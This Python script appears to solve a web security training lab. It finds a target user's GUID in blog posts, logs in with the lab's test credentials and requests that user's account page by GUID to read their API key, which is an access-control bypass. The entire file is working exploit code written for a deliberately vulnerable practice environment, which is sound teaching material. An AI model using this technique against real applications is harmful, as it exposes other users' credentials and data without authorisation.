import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.guid = None
        self.api_key = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def get_carlos_guid(self):
        response = self.session.get(self.lab_url)
        posts = re.findall(r'<a href="(/post\?postId=.*?)"', response.text)
        for post in posts:
            response = self.session.get(self.lab_url + post[1:])
            if 'carlos' in response.text:
                self.guid = re.search(r'/blogs\?userId=(.*?)\'', response.text).group(1)
                break

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def get_carlos_api_key(self):
        response = self.session.get(self.lab_url + 'my-account?id={}'.format(self.guid))
        self.api_key = re.search(r'Your API Key is: (.*?)<', response.text).group(1)

    def submit_solution(self):
        data = {
            'answer': self.api_key
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_carlos_guid()
        self.sign_in_as_wiener()
        self.get_carlos_api_key()
        self.submit_solution()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
